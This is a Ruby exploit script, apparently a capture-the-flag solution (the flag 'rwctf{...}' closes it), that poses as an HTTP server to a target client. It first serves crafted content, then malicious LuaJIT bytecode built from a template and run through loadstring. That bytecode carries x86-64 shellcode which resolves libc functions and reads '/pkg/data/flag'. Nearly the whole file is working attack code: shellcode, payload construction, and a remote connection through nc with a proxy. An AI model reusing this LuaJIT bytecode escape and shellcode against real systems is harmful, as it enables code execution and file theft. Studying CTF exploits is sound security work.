#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = '127.0.0.1', 31337
@local = false
if ARGV[0] != 'r'
  host = '127.0.0.1'; @local = true
  $z = Sock.new host, port
else
  raise ArgumentError, 'host not set' if host.empty?
  $z = Tubes::Process.new('nc -x 13.231.236.212:1337 100.100.0.103 31337')
end
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def response(content, type = :lua)
  z.write <<-EOS.gsub("\n", "\r\n") + content
HTTP/1.0 200 OK
Content-Type: text/#{type == :html ? 'html' : 'x-lua'}
Content-Length: #{content.size}

EOS
end

content = <<-EOS
Disallow: /XDDDDD
Disallow: /aa
EOS

response(content, :html)

# z.gets 'XDDDDD'
# STDIN.gets
shellcode = asm(<<-EOS)
mov rbp, 0x10000fa8
mov rbp, qword ptr [rbp]
sub rbp, 0x6f8b0

lea rdi, [rip + path]
lea rsi, [rip + rb]
call fopen

mov r12, rax
mov rdi, 0x10000000
mov rsi, 1
mov rdx, 100
mov rcx, r12
call fread

mov rdi, 0x10000000
call token_puts

fopen:
  mov rax, rbp
  add rax, 0x73370
  jmp rax

fread:
  mov rax, rbp
  add rax, 0x733c0
  jmp rax

token_puts:
  mov rax, rdi
  mov rsi, rbp
  add rsi, 0x6bfa4
  jmp rsi

path:
  .string "/pkg/data/flag"
rb:
  .string "r"
EOS

puts disasm(shellcode)
IO.binwrite('make_evil.lua', IO.binread('make_evil.tpl.lua').gsub('SHELLCODE', shellcode.bytes.map{|c|"\\x%02x" % c}.join))

# Run make_evil.lua
`cd LuaJIT-2.1.0-beta1/src/; ./luajit ../../make_evil.lua; mv evil.lua ../../`

s = IO.binread('evil.lua')
lua = <<-EOS
local evil = "#{s.bytes.map{|c|'\\x%02x' % c}.join}";
fdb0cdf28c53764e = loadstring(evil);
EOS
response(lua)
# debug!

z.interact

# rwctf{How much time have you spent on shellcode?}
